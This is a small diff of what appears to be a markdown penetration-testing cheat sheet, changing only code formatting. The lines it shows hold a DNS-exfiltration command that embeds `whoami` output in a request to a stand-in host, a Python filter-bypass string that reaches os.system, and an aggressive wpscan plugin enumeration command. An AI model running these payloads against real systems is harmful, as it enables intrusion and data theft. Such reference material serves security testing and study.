@@ -1179,10 +1179,10 @@ https://nodejs.org/api/process.html
 ### RCE - Exfiltrating via dns
 
 `curl http://$(whoami).site.com/`  
-`curl http://\`whoami\`.site.com/`
+`curl http://`whoami`.site.com/`
    
 -> Tricks - Bypass  
-builtins_filter_bypass = "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
+`"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";`
 
 ### Shellshock
 
@@ -1192,7 +1192,7 @@ builtins_filter_bypass = "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower
 
 #### Wordpress
 
--> Tool
+-> Tool  
 `wpscan --url http://site.com/wordpress --api-token <your_token> --enumarate vp --plugins-detection aggressive`  
 https://wpscan.com/wordpress-security-scanner
 
